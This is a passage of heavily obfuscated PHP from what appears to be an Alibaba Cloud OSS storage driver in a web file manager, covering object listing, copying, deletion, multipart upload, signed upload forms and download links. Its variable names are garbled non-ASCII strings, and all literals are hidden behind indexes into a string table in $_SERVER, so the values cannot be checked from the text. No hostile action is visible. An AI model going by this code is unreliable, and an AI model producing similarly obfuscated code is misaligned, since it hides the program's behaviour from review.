(OSS\Core\OssException $£ù†¼É) { return !1; } return $this->getPathOuter($Ğªè¹); } private function fileList($ğÂÌÛ¼, $Š«¬Äû = '', $é²—Ë“¥ = 0) { $¹’Ø • =& $_SERVER[ •ŒÓîÆ]; $ğÂÌÛ¼ = trim($ğÂÌÛ¼, $¹’Ø •[8]); $îõû¥ = empty($ğÂÌÛ¼) && $ğÂÌÛ¼ !== $¹’Ø •[214] ? $¹’Ø •[12] : $ğÂÌÛ¼ . $¹’Ø •[8]; $÷áùŠÛü = $¹’Ø •[12]; $£Ò¬Îª¥ = 1000; $Íâ•ÖÔÛ = $ÇÕÃñõ‰ = array(); while (!0) { check_abort(); $–Ò”ùÔ— = array($¹’Ø •[1423] => $Š«¬Äû, $¹’Ø •[1424] => $îõû¥, $¹’Ø •[1425] => $£Ò¬Îª¥, $¹’Ø •[1426] => $÷áùŠÛü); try { $¼šœâÙÚ = $this->client->listObjects($this->bucket, $–Ò”ùÔ—); } catch (OSS\Core\OssException $•ÈäŞóæ) { break; } $÷áùŠÛü = $¼šœâÙÚ->getNextMarker(); $ÖŸôæŠ¯ = $¼šœâÙÚ->getObjectList(); $ü ‡¦à£ = $¼šœâÙÚ->getPrefixList(); foreach ($ÖŸôæŠ¯ as $—¼†‡ğò) { if ($—¼†‡ğò->getKey() == $îõû¥) { continue; } $ã¼§ä‰ª = $—¼†‡ğò->getKey(); $õ–ŸÜ… = $—¼†‡ğò->getSize(); $ £úÓñ = $—¼†‡ğò->getLastModified(); $²Š±œª• = trim($—¼†‡ğò->getETag(), $¹’Ø •[120]); $«›µµŞ¹ = $é²—Ë“¥ ? array($¹’Ø •[32] => $ã¼§ä‰ª, $¹’Ø •[78] => $õ–ŸÜ…, $¹’Ø •[196] => strtotime($ £úÓñ), $¹’Ø •[1427] => $²Š±œª•) : $ã¼§ä‰ª; $ì·È¥»„ = $õ–ŸÜ… == 0 && substr($ã¼§ä‰ª, strlen($ã¼§ä‰ª) - 1, 1) == $¹’Ø •[8] ? !0 : !1; $µô—ƒ” = array($¹’Ø •[78] => $õ–ŸÜ…, $¹’Ø •[1428] => $õ–ŸÜ…, $¹’Ø •[87] => strtotime($ £úÓñ), $¹’Ø •[1429] => $ £úÓñ, $¹’Ø •[1427] => $²Š±œª•); $this->cacheMethodInfoSet($ã¼§ä‰ª, $ì·È¥»„, $µô—ƒ”); if ($ì·È¥»„) { $Íâ•ÖÔÛ[] = $ã¼§ä‰ª; continue; } $ÇÕÃñõ‰[] = $«›µµŞ¹; } foreach ($ü ‡¦à£ as $–¡‹Ÿ—) { $Íâ•ÖÔÛ[] = $–¡‹Ÿ—->getPrefix(); $this->cacheMethodInfoSet($–¡‹Ÿ—->getPrefix(), !0); } if ($÷áùŠÛü === $¹’Ø •[12]) { break; } } $this->cacheMethodInfoSet($ğÂÌÛ¼, !0); return array($¹’Ø •[84] => $Íâ•ÖÔÛ, $¹’Ø •[85] => $ÇÕÃñõ‰); } public function copyFile($ö°‰ğáÌ, $Ø¡¼¨•×) { $ğ‹üñşô = $this->size($ö°‰ğáÌ); if ($ğ‹üñşô < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ö°‰ğáÌ, $this->bucket, $this->pathEncode($Ø¡¼¨•×)); } catch (OSS\Core\OssException $³•ïëÉÕ) { return !1; } return $this->getPathOuter($Ø¡¼¨•×); } $ãõõãï¢ = $this->multiCopyObject($ö°‰ğáÌ, $Ø¡¼¨•×, $ğ‹üñşô); return $ãõõãï¢ ? $this->getPathOuter($Ø¡¼¨•×) : !1; } private function multiCopyObject($è³¦Ø€, $â’ñÍ, $îİæêêº) { $èè©¡û =& $_SERVER[ •ŒÓîÆ]; try { $ü¯­î¾ç = array(); if ($ÌœŒ¦¿ú = $this->hashMd5($è³¦Ø€)) { $ü¯­î¾ç = array(OSS\OssClient::OSS_HEADERS => array($èè©¡û[1430] => $ÌœŒ¦¿ú)); } $ù¹¹É¡Ş = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($â’ñÍ), $ü¯­î¾ç); $¤¥êÀ™ê = 1; $çû­ğ¼ = 0; $†‘ÈÍÎë = array(); $¹¸èĞ°ç = 1024 * 1024 * 10; $ÛÃŒª¶ = $this->client->generateMultiuploadParts($îİæêêº, $¹¸èĞ°ç); foreach ($ÛÃŒª¶ as $´×îÖ¡ğ => $µÏùÖ›) { $òŠ¨ëì„ = $çû­ğ¼ + (int) $µÏùÖ›[$èè©¡û[1431]]; $­€İÉí = (int) $µÏùÖ›[$èè©¡û[392]] + $òŠ¨ëì„ - 1; $¶‹­– = array($èè©¡û[1432] => $òŠ¨ëì„, $èè©¡û[1433] => $­€İÉí); $†‘ÈÍÎë[] = $this->client->uploadPartCopy($this->bucket, $è³¦Ø€, $this->bucket, $this->pathEncode($â’ñÍ), $¤¥êÀ™ê, $ù¹¹É¡Ş, $¶‹­–); $¤¥êÀ™ê = $¤¥êÀ™ê + 1; } $‹‹û€¦ = array(); foreach ($†‘ÈÍÎë as $´×îÖ¡ğ => $¥ÜüâÆ±) { $‹‹û€¦[] = array($èè©¡û[1434] => $´×îÖ¡ğ + 1, $èè©¡û[1435] => $¥ÜüâÆ±); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($â’ñÍ), $ù¹¹É¡Ş, $‹‹û€¦); } catch (OSS\Core\OssException $Õá°Ò ) { return !1; } return !0; } public function moveFile($ªš”„, $®€‡âì) { if ($this->copyFile($ªš”„, $®€‡âì)) { $this->remove($ªš”„); return $this->getPathOuter($®€‡âì); } return !1; } public function delFile($æ†ÛÓÕ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($æ†ÛÓÕ)); } catch (OSS\Core\OssException $ï€”£å) { return !1; } return !0; } public function delFolder($¥®Àü¡) { $ˆŞİëÕ =& $_SERVER[ •ŒÓîÆ]; if (!$this->exist($¥®Àü¡)) { return !0; } $this->listItemCache = !1; $áœ²úÕà = $this->fileList($¥®Àü¡); $this->listItemCache = !0; $Şòà™† = trim($¥®Àü¡, $ˆŞİëÕ[8]) . $ˆŞİëÕ[8]; if (!empty($¥®Àü¡) && $¥®Àü¡ !== $ˆŞİëÕ[214] && !in_array($Şòà™†, $áœ²úÕà[$ˆŞİëÕ[84]])) { $áœ²úÕà[$ˆŞİëÕ[84]][] = $Şòà™†; } $¦Ú¸«‡œ = $this->delByBatch($áœ²úÕà[$ˆŞİëÕ[85]]); if (!$¦Ú¸«‡œ) { return !1; } $¦Ú¸«‡œ = $this->delByBatch($áœ²úÕà[$ˆŞİëÕ[84]]); if (!$¦Ú¸«‡œ) { return !1; } return $this->delFile($Şòà™†); } private function delByBatch($ô†ã¾×¨) { foreach (array_chunk($ô†ã¾×¨, 1000) as $”à”è‰œ) { try { $this->client->deleteObjects($this->bucket, $”à”è‰œ); } catch (OSS\Core\OssException $•Å¾ˆŞï) { return !1; } } return !0; } public function rename($…‹“÷Äú, $·‘Ñßê) { return $this->renameObject($…‹“÷Äú, $·‘Ñßê); } private function fileInfo($ƒò®ääÆ, $·áêçßü = false, $«Åºñúß = array()) { $­“×áÕ =& $_SERVER[ •ŒÓîÆ]; $—‹úˆ¼© = array($­“×áÕ[32] => $this->pathThis($ƒò®ääÆ), $­“×áÕ[86] => $this->getPathOuter($ƒò®ääÆ), $­“×áÕ[33] => $­“×áÕ[216], $­“×áÕ[78] => isset($«Åºñúß[$­“×áÕ[78]]) ? $«Åºñúß[$­“×áÕ[78]] : 0, $­“×áÕ[177] => $this->ext($ƒò®ääÆ)); if ($·áêçßü) { return $—‹úˆ¼©; } $—‹úˆ¼©[$­“×áÕ[217]] = $—‹úˆ¼©[$­“×áÕ[87]] = 0; $—‹úˆ¼©[$­“×áÕ[218]] = $—‹úˆ¼©[$­“×áÕ[219]] = !0; if (empty($«Åºñúß)) { $äïûÀÎ³ = $this->objectMeta($ƒò®ääÆ); if (!$äïûÀÎ³) { return $—‹úˆ¼©; } $«Åºñúß = array($­“×áÕ[87] => strtotime($äïûÀÎ³[$­“×áÕ[1429]]), $­“×áÕ[78] => $äïûÀÎ³[$­“×áÕ[1428]] + 0, $­“×áÕ[1427] => $äïûÀÎ³[$­“×áÕ[1427]]); } if (isset($«Åºñúß[$­“×áÕ[1427]]) && $«Åºñúß[$­“×áÕ[1427]]) { $—‹úˆ¼©[$­“×áÕ[221]] = trim($«Åºñúß[$­“×áÕ[1427]], $­“×áÕ[120]); } if (isset($«Åºñúß[$­“×áÕ[78]])) { $—‹úˆ¼©[$­“×áÕ[78]] = $«Åºñúß[$­“×áÕ[78]]; } if (isset($«Åºñúß[$­“×áÕ[87]])) { $—‹úˆ¼©[$­“×áÕ[87]] = $«Åºñúß[$­“×áÕ[87]]; } if (isset($«Åºñúß[$­“×áÕ[196]]) && !trim($—‹úˆ¼©[$­“×áÕ[87]])) { $—‹úˆ¼©[$­“×áÕ[87]] = $«Åºñúß[$­“×áÕ[196]]; } return $—‹úˆ¼©; } private function folderInfo($×º¡ïó¶, $æı»€—í = false, $ñÑøò = array()) { $ùİ¨¦û³ =& $_SERVER[ •ŒÓîÆ]; $©€¾õ´Œ = array($ùİ¨¦û³[32] => $this->pathThis($×º¡ïó¶), $ùİ¨¦û³[86] => $this->getPathOuter($ùİ¨¦û³[8] . $×º¡ïó¶), $ùİ¨¦û³[33] => $ùİ¨¦û³[77]); if ($æı»€—í) { return $©€¾õ´Œ; } $©€¾õ´Œ[$ùİ¨¦û³[217]] = $©€¾õ´Œ[$ùİ¨¦û³[87]] = 0; $©€¾õ´Œ[$ùİ¨¦û³[218]] = $©€¾õ´Œ[$ùİ¨¦û³[219]] = !0; if (empty($ñÑøò)) { $×º¡ïó¶ = rtrim($×º¡ïó¶, $ùİ¨¦û³[8]) . $ùİ¨¦û³[8]; $ÒóÑğ˜À = $this->objectMeta($×º¡ïó¶); if (!$ÒóÑğ˜À) { return $©€¾õ´Œ; } $ñÑøò = array($ùİ¨¦û³[217] => $ÒóÑğ˜À[$ùİ¨¦û³[556]][$ùİ¨¦û³[1436]], $ùİ¨¦û³[87] => strtotime($ÒóÑğ˜À[$ùİ¨¦û³[1429]])); } if (isset($ñÑøò[$ùİ¨¦û³[87]])) { $©€¾õ´Œ[$ùİ¨¦û³[87]] = $ñÑøò[$ùİ¨¦û³[87]]; } if (isset($ñÑøò[$ùİ¨¦û³[217]])) { $©€¾õ´Œ[$ùİ¨¦û³[217]] = $ñÑøò[$ùİ¨¦û³[217]]; } return $©€¾õ´Œ; } public function listPath($¥ü´—€‹, $¡Œí“µĞ = false) { $ˆ˜ËÆú =& $_SERVER[ •ŒÓîÆ]; $êõ‹úä = $this->fileList($¥ü´—€‹, $ˆ˜ËÆú[8], !0); foreach ($êõ‹úä[$ˆ˜ËÆú[84]] as $›ñ¨ÃæÒ => $ìƒúèıİ) { $êõ‹úä[$ˆ˜ËÆú[84]][$›ñ¨ÃæÒ] = $this->folderInfo($ìƒúèıİ, $¡Œí“µĞ, $ìƒúèıİ); } foreach ($êõ‹úä[$ˆ˜ËÆú[85]] as $›ñ¨ÃæÒ => $ìƒúèıİ) { $êõ‹úä[$ˆ˜ËÆú[85]][$›ñ¨ÃæÒ] = $this->fileInfo($ìƒúèıİ[$ˆ˜ËÆú[32]], $¡Œí“µĞ, $ìƒúèıİ); } return $êõ‹úä; } protected function infoChildren($ªÉïÈÔ, &$¿¹’ Ò) { $÷„ÈÊíÄ =& $_SERVER[ •ŒÓîÆ]; $¸Ò–ˆº° = $this->fileList($ªÉïÈÔ, $÷„ÈÊíÄ[12], !0); $¿¹’ Ò[$÷„ÈÊíÄ[80]] += count($¸Ò–ˆº°[$÷„ÈÊíÄ[84]]); $¿¹’ Ò[$÷„ÈÊíÄ[79]] += count($¸Ò–ˆº°[$÷„ÈÊíÄ[85]]); foreach ($¸Ò–ˆº°[$÷„ÈÊíÄ[85]] as $‘ìèÏÒƒ) { if (!$‘ìèÏÒƒ || !$‘ìèÏÒƒ[$÷„ÈÊíÄ[78]]) { continue; } $¿¹’ Ò[$÷„ÈÊíÄ[78]] += $‘ìèÏÒƒ[$÷„ÈÊíÄ[78]]; } } public function has($”ÅĞƒŞ¦, $ÛéÁš„¼ = false, $†©èÕ = true) { $ÛÜ¢‡’ =& $_SERVER[ •ŒÓîÆ]; $”ÅĞƒŞ¦ = trim($”ÅĞƒŞ¦, $ÛÜ¢‡’[8]); $ÓÅôŒÆİ = empty($”ÅĞƒŞ¦) && $”ÅĞƒŞ¦ !== $ÛÜ¢‡’[214] ? $ÛÜ¢‡’[12] : $”ÅĞƒŞ¦ . $ÛÜ¢‡’[8]; $ˆŒˆ©ÜÍ = $ÛÜ¢‡’[12]; $¦ÎÔ¹¹› = 500; $–¤İõ³ù = $Ëç¹™õ = 0; while (!0) { check_abort(); $Ö·÷¶„¶ = array($ÛÜ¢‡’[1423] => $ÛÜ¢‡’[8], $ÛÜ¢‡’[1424] => $ÓÅôŒÆİ, $ÛÜ¢‡’[1425] => $¦ÎÔ¹¹›, $ÛÜ¢‡’[1426] => $ˆŒˆ©ÜÍ); try { $ù§ÇşêÒ = $this->client->listObjects($this->bucket, $Ö·÷¶„¶); } catch (OSS\Core\OssException $å±ÂØ¯‰) { break; } $ˆŒˆ©ÜÍ = $ù§ÇşêÒ->getNextMarker(); $¶ˆÙƒ¨ = $ù§ÇşêÒ->getObjectList(); $Çç›ÏË  = $ù§ÇşêÒ->getPrefixList(); if ($ÛéÁš„¼) { if (count($¶ˆÙƒ¨) > 1 || count($¶ˆÙƒ¨) == 1 && $¶ˆÙƒ¨[0]->getKey() != $ÓÅôŒÆİ) { $–¤İõ³ù += count($¶ˆÙƒ¨) - 1; } if (!empty($Çç›ÏË )) { $Ëç¹™õ += count($Çç›ÏË ); } if ($ˆŒˆ©ÜÍ === $ÛÜ¢‡’[12]) { break; } continue; } if ($†©èÕ) { if (!empty($¶ˆÙƒ¨)) { if (count($¶ˆÙƒ¨) > 1 || $¶ˆÙƒ¨[0]->getKey() != $ÓÅôŒÆİ) { return !0; } } } else { if (!empty($Çç›ÏË )) { return !0; } } if ($ˆŒˆ©ÜÍ === $ÛÜ¢‡’[12]) { break; } } if ($ÛéÁš„¼) { return array($ÛÜ¢‡’[225] => $–¤İõ³ù, $ÛÜ¢‡’[226] => $Ëç¹™õ); } return !1; } public function listAll($èŸùŠÆ) { $ÚÚïéÉ =& $_SERVER[ •ŒÓîÆ]; $æ¸ïú· = $this->fileList($èŸùŠÆ, $ÚÚïéÉ[12], !0); $®±ë…›Å = array_to_keyvalue($æ¸ïú·[$ÚÚïéÉ[85]], $ÚÚïéÉ[32]); foreach ($æ¸ïú·[$ÚÚïéÉ[84]] as $Ş€è ´û) { if (is_string($Ş€è ´û)) { $®±ë…›Å[$Ş€è ´û] = array($ÚÚïéÉ[78] => 0); } } return $this->listAllFiles($èŸùŠÆ, $®±ë…›Å); } public function canRead($Ùô´¹‘) { $ªĞ°áµ =& $_SERVER[ •ŒÓîÆ]; $êÏıÒÄµ = $this->pathAcl($Ùô´¹‘); return $êÏıÒÄµ == $ªĞ°áµ[1437] || $êÏıÒÄµ == $ªĞ°áµ[599] ? !0 : !1; } public function canWrite($ÊòÈ¤à») { $‰¯Ùï¢Î = $this->pathAcl($ÊòÈ¤à»); return $‰¯Ùï¢Î == $_SERVER[ •ŒÓîÆ][599] ? !0 : !1; } public function pathAcl($ÎÅ½÷š¶) { $ùÕéĞ»£ =& $_SERVER[ •ŒÓîÆ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¿ù¡©— = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÎÅ½÷š¶)); } catch (OSS\Core\OssException $–Ø–¹§«) { return !1; } $àÕ¨Ğ“· = $¿ù¡©— == $ùÕéĞ»£[37] ? $this->bucketAcl : $¿ù¡©—; if ($àÕ¨Ğ“· == $ùÕéĞ»£[1438]) { return $ùÕéĞ»£[1437]; } if ($àÕ¨Ğ“· == $ùÕéĞ»£[1439]) { return $ùÕéĞ»£[599]; } return $àÕ¨Ğ“·; } private function chmodPath($Š·ëñ¨Ø, $¿Ï×ı—ı = '') { $İâ¢ßøú =& $_SERVER[ •ŒÓîÆ]; $„˜¸’ù¼ = empty($¿Ï×ı—ı) ? $İâ¢ßøú[1439] : $¿Ï×ı—ı; $ş»¶ñŒ = array($İâ¢ßøú[37], $İâ¢ßøú[215], $İâ¢ßøú[1438], $İâ¢ßøú[1439]); if (!in_array($„˜¸’ù¼, $ş»¶ñŒ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Š·ëñ¨Ø), $„˜¸’ù¼); } catch (OSS\Core\OssException $ô¾‚±¬÷) { return !1; } return !0; } public function getContent($ÈüáÚÀ†) { return $this->fileSubstr($ÈüáÚÀ†, -1); } public function setContent($²ƒ±Ãª©, $‰ŸÆ¿ï½ = '') { $úÅÙæÀÇ =& $_SERVER[ •ŒÓîÆ]; try { $ƒŞ†¨«Š = $this->trafficLimit($úÅÙæÀÇ[1440]); $ÆÉÅ¨àà = $this->client->putObject($this->bucket, $this->pathEncode($²ƒ±Ãª©), $‰ŸÆ¿ï½, $ƒŞ†¨«Š); } catch (OSS\Core\OssException $ğ“Å™½²) { return !1; } $ãûÍ€Ìº = array($úÅÙæÀÇ[1430] => trim($ÆÉÅ¨àà[$úÅÙæÀÇ[1427]], $úÅÙæÀÇ[120]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($²ƒ±Ãª©))); $this->updateObjMeta($²ƒ±Ãª©, $ãûÍ€Ìº); return isset($ÆÉÅ¨àà[$úÅÙæÀÇ[1441]][$úÅÙæÀÇ[286]]) ? !0 : !1; } private function updateObjMeta($˜Á¬İ¬Î, $ùÛöšÑÓ) { $˜Á¬İ¬Î = $this->pathEncode($˜Á¬İ¬Î); try { $‡ ×õ‰Ñ = array(OSS\OssClient::OSS_HEADERS => $ùÛöšÑÓ); $this->client->copyObject($this->bucket, $˜Á¬İ¬Î, $this->bucket, $˜Á¬İ¬Î, $‡ ×õ‰Ñ); } catch (OSS\Core\OssException $ÀÄı†¿“) { return !1; } return !0; } public function upload($¡¨èÛ£¹, $…ÁšÔª–, $Äí†ÃİÃ = false, $…ıË‹À˜ = REPEAT_REPLACE) { $Ú¿ç˜ß¡ =& $_SERVER[ •ŒÓîÆ]; $ŒŸ…Ë² = trim($¡¨èÛ£¹, $Ú¿ç˜ß¡[8]); $êÎÈ±ÔŒ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Ú¿ç˜ß¡[1430] => @md5_file($…ÁšÔª–)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¡¨èÛ£¹))); $êÎÈ±ÔŒ = $this->trafficLimit($Ú¿ç˜ß¡[1440], $êÎÈ±ÔŒ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ŒŸ…Ë²), $…ÁšÔª–, $êÎÈ±ÔŒ); } catch (OSS\Core\OssException $ÂÔ°Ì¿ï) { return !1; } return $this->getPathOuter($¡¨èÛ£¹); } public function getHost() { $úœØ’ş³ =& $_SERVER[ •ŒÓîÆ]; $«ï¬æ÷¶ = explode($úœØ’ş³[200], parent::getHost()); return $«ï¬æ÷¶[0] . $úœØ’ş³[200] . $this->bucket . $úœØ’ş³[10] . $«ï¬æ÷¶[1]; } public function uploadFormData($÷èßÙ´, $é¦”ö¦¡ = 3600) { $ÌˆÃ€æğ =& $_SERVER[ •ŒÓîÆ]; if (!($êõó¡ÒÓ = $this->getHost())) { return !1; } $¼ˆâŠÈˆ = $é¦”ö¦¡; $ÖÁ½¯Ù‹ = date($ÌˆÃ€æğ[1442], time() + $¼ˆâŠÈˆ); $èÍ÷±÷ì = new DateTime($ÖÁ½¯Ù‹); $¯ñì°Á = $èÍ÷±÷ì->format(DateTime::ISO8601); $³â…ËÏİ = strpos($¯ñì°Á, $ÌˆÃ€æğ[351]); $¯ñì°Á = substr($¯ñì°Á, 0, $³â…ËÏİ) . $ÌˆÃ€æğ[1443]; $Í´Ó«ô = 1048576000 * 5; $ùÅÑÌ¥½ = $this->pathFather($÷èßÙ´); $’–¿˜ŸŸ = array($ÌˆÃ€æğ[269] => $¯ñì°Á, $ÌˆÃ€æğ[272] => array(array($ÌˆÃ€æğ[1444], 0, $Í´Ó«ô), array($ÌˆÃ€æğ[275], $ÌˆÃ€æğ[276], $ùÅÑÌ¥½))); $ú”ŠËşÜ = base64_encode(json_encode($’–¿˜ŸŸ)); $«Œ¼Í®Ú = base64_encode(hash_hmac($ÌˆÃ€æğ[249], $ú”ŠËşÜ, $this->secret, !0)); $üÅçòòê = array($ÌˆÃ€æğ[287] => $ú”ŠËşÜ, $ÌˆÃ€æğ[1445] => $this->accessKey, $ÌˆÃ€æğ[279] => $ÌˆÃ€æğ[268], $ÌˆÃ€æğ[1446] => $«Œ¼Í®Ú, $ÌˆÃ€æğ[198] => $êõó¡ÒÓ); $üÅçòòê = $this->trafficLimit($ÌˆÃ€æğ[1440], $üÅçòòê); return $üÅçòòê; } public function multiUploadFormData($ñêîğÀƒ, $üŸöú¢§ = 3600) { $Ÿß°Ò«ı =& $_SERVER[ •ŒÓîÆ]; if (!($†§™°ã = $this->getHost())) { return !1; } $µƒíò½¤ = $this->trafficLimit($Ÿß°Ò«ı[1440]); $‚à·Ñ˜ø = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ñêîğÀƒ), $µƒíò½¤); return array($Ÿß°Ò«ı[240] => $‚à·Ñ˜ø, $Ÿß°Ò«ı[198] => $†§™°ã . $Ÿß°Ò«ı[8] . $this->pathEncode($ñêîğÀƒ), $Ÿß°Ò«ı[241] => gmdate($Ÿß°Ò«ı[1447]), $Ÿß°Ò«ı[96] => $ñêîğÀƒ); } public function multiUploadAuthData($Úù£ù, $ˆïßå‘É = array()) { $òË—šÛ® =& $_SERVER[ •ŒÓîÆ]; $¸¨ŒÔ¸™ = isset($ˆïßå‘É[$òË—šÛ®[241]]) ? $ˆïßå‘É[$òË—šÛ®[241]] : gmdate($òË—šÛ®[1447]); $àÛ»ıêÔ = isset($ˆïßå‘É[$òË—šÛ®[177]]) ? $ˆïßå‘É[$òË—šÛ®[177]] : $òË—šÛ®[12]; $ØÓ“¬“† = $Úù£ù; if (isset($ˆïßå‘É[$òË—šÛ®[96]])) { $ØÓ“¬“† = $ˆïßå‘É[$òË—šÛ®[96]]; unset($ˆïßå‘É[$òË—šÛ®[96]]); } if (isset($ˆïßå‘É[$òË—šÛ®[242]])) { $ˆïßå‘É[$òË—šÛ®[241]] = $¸¨ŒÔ¸™; return $this->listUploadParts($ØÓ“¬“†, $ˆïßå‘É); } $º¾‰èìê = array($òË—šÛ®[243], $òË—šÛ®[12], $òË—šÛ®[122], $¸¨ŒÔ¸™, "\x78\x2d\x6f\x73\x73\55\144\141\164\x65\x3a{$¸¨ŒÔ¸™}", $òË—šÛ®[8] . $this->bucket . $òË—šÛ®[8] . $ØÓ“¬“† . $àÛ»ıêÔ); if (strpos($àÛ»ıêÔ, $òË—šÛ®[244]) === 0) { $º¾‰èìê[0] = $òË—šÛ®[245]; if ($ îÖœÎ = $this->trafficLimit($òË—šÛ®[1440])) { $ØÓ“¬“† = $òË—šÛ®[1448]; array_splice($º¾‰èìê, 5, 0, $ØÓ“¬“† . $òË—šÛ®[4] . $ îÖœÎ[$ØÓ“¬“†]); } } if (isset($ˆïßå‘É[$òË—šÛ®[246]]) && $ˆïßå‘É[$òË—šÛ®[246]] == $òË—šÛ®[247]) { $º¾‰èìê[0] = $òË—šÛ®[247]; } if (!empty($ˆïßå‘É[$òË—šÛ®[1449]])) { $•¥ÉúÈÂ = array_merge(array($º¾‰èìê[4]), $ˆïßå‘É[$òË—šÛ®[1449]]); sort($•¥ÉúÈÂ); $º¾‰èìê[4] = implode($òË—šÛ®[248], $•¥ÉúÈÂ); } $èÔò’µ” = implode($òË—šÛ®[248], $º¾‰èìê); $êØûã™ = base64_encode(hash_hmac($òË—šÛ®[249], $èÔò’µ”, $this->secret, !0)); $éôÅ¶ŞÄ = $òË—šÛ®[1413] . $this->accessKey . $òË—šÛ®[4] . $êØûã™; if (strpos($àÛ»ıêÔ, $òË—šÛ®[244]) === 0) { $éôÅ¶ŞÄ = array($òË—šÛ®[251] => $éôÅ¶ŞÄ, $òË—šÛ®[241] => $¸¨ŒÔ¸™); if ($ îÖœÎ) { $éôÅ¶ŞÄ = array_merge($éôÅ¶ŞÄ, $ îÖœÎ); } } return $éôÅ¶ŞÄ; } public function listUploadParts($î»Ê³©É, $²¯…¿Š‰) { $·Ñàã… =& $_SERVER[ •ŒÓîÆ]; $¯‰í°û¿ = parse_url_query($²¯…¿Š‰[$·Ñàã…[177]]); $Ï³›µçÛ = $this->client->listParts($this->bucket, $this->pathEncode($î»Ê³©É), $¯‰í°û¿[$·Ñàã…[240]]); $§ìÓúû = $Ï³›µçÛ->getListPart(); $Áê³ = array(); foreach ($§ìÓúû as $ØÈ¢¢ñ¯) { $Áê³[] = array($·Ñàã…[1434] => $ØÈ¢¢ñ¯->getPartNumber(), $·Ñàã…[1435] => trim($ØÈ¢¢ñ¯->getETag(), $·Ñàã…[120])); } unset($²¯…¿Š‰[$·Ñàã…[242]], $²¯…¿Š‰[$·Ñàã…[246]]); $âš˜ØßŠ = $this->multiUploadAuthData($î»Ê³©É, $²¯…¿Š‰); if (empty($âš˜ØßŠ)) { return !1; } return array($·Ñàã…[251] => $âš˜ØßŠ, $·Ñàã…[241] => $²¯…¿Š‰[$·Ñàã…[241]], $·Ñàã…[253] => $Áê³); } public function download($ÖÏî™ßõ, $öÅ½—Æ£) { if ($this->isFolder($ÖÏî™ßõ)) { return !1; } try { $×ùâä· = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $öÅ½—Æ£); $×ùâä· = $this->trafficLimit($_SERVER[ •ŒÓîÆ][111], $×ùâä·); $this->client->getObject($this->bucket, $this->pathEncode($ÖÏî™ßõ), $×ùâä·); } catch (OSS\Core\OssException $àÃ¸‡¡ã) { return !1; } return $öÅ½—Æ£; } public function fileSubstr($«­øİòî, $÷éÚÙ˜§ = 0, $Ëºà¬é² = false) { if ($÷éÚÙ˜§ === -1) { $‹Â¼¼†· = array(); } else { if ($Ëºà¬é² === !1) { $Úµ´öÙ‰ = $this->size($«­øİòî); } else { $Úµ´öÙ‰ = $÷éÚÙ˜§ + $Ëºà¬é² - 1; } $‹Â¼¼†· = array(OSS\OssClient::OSS_RANGE => "{$÷éÚÙ˜§}\55{$Úµ´öÙ‰}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($«­øİòî), $‹Â¼¼†·); } catch (OSS\Core\OssException $…œåƒ¹¸) { think_exception($…œåƒ¹¸->getMessage()); return !1; } } private function trafficLimit($¿êäÓ à, $ÂŞ¯¬Ÿ = array()) { $°èœâ¿ =& $_SERVER[ •ŒÓîÆ]; if ($¿êäÓ à == $°èœâ¿[1440] && $this->isUploadServer() || $¿êäÓ à == $°èœâ¿[111] && $this->isFileOutServer()) { return $ÂŞ¯¬Ÿ; } $ÇÊ‰’×” = floatval($GLOBALS[$°èœâ¿[6]][$°èœâ¿[91]][$°èœâ¿[109]][$¿êäÓ à]) * 1024 * 1024 * 8; if (!$ÇÊ‰’×”) { return $ÂŞ¯¬Ÿ; } $ÇÊ‰’×” = $ÇÊ‰’×” < 819200 ? 819200 : ($ÇÊ‰’×” > 838860800 ? 838860800 : $ÇÊ‰’×”); $ÂŞ¯¬Ÿ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÇÊ‰’×”); return $ÂŞ¯¬Ÿ; } public function link($¯á‰ˆ™, $ÓÁ‚óÌá = array()) { $¤¹óıƒü =& $_SERVER[ •ŒÓîÆ]; if (!$this->exist($¯á‰ˆ™) || $this->isFolder($¯á‰ˆ™)) { return !1; } try { $ÓÁ‚óÌá = $this->trafficLimit($¤¹óıƒü[111], $ÓÁ‚óÌá); $ñ½ãÕªò = $this->client->signUrl($this->bucket, $this->pathEncode($¯á‰ˆ™), 3600 * 12, $¤¹óıƒü[247], $ÓÁ‚óÌá); return $this->getCdnLink($ñ½ãÕªò); } catch (OSS\Core\OssException $¡’Œ”Ó) { return !1; } } public function fileOut($ıË’ª˜ì, $İâÎŸÉ¸ = false, $­„Š¹¶Š = false, $ÔâÅ¯™Î = '') { $é“³›“Ô =& $_SERVER[ •ŒÓîÆ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ıË’ª˜ì, $İâÎŸÉ¸, $­„Š¹¶Š, $ÔâÅ¯™Î); } if (!$­„Š¹¶Š) { $­„Š¹¶Š = $this->pathThis($ıË’ª˜ì); } $­„Š¹¶Š = rawurlencode($­„Š¹¶Š); $¯ÊõÀ•ö = get_file_mime(get_path_ext($­„Š¹¶Š)); if ($¯ÊõÀ•ö == $é“³›“Ô[234]) { return parent::fileOut($ıË’ª˜ì, $İâÎŸÉ¸, $­„Š¹¶Š, $ÔâÅ¯™Î); } $İâÎŸÉ¸ = $İâÎŸÉ¸ ? $é“³›“Ô[1450] : $é“³›“Ô[1451]; $¢É³ğĞ = array(OSS\OssClient::OSS_SUB_RESOURCE => $é“³›“Ô[1452] . rawurlencode("{$İâÎŸÉ¸}\73\146\151\x6c\145\156\141\155\x65\x3d{$­„Š¹¶Š}")); $¢É³ğĞ[OSS\OssClient::OSS_SUB_RESOURCE] .= $é“³›“Ô[1453] . rawurlencode($¯ÊõÀ•ö); $³û²Øùş = $this->link($ıË’ª˜ì, $¢É³ğĞ); $this->fileOutLink($³û²Øùş); } public function fileOutServer($¾ö»‡Äù, $Ìô•İÙó = 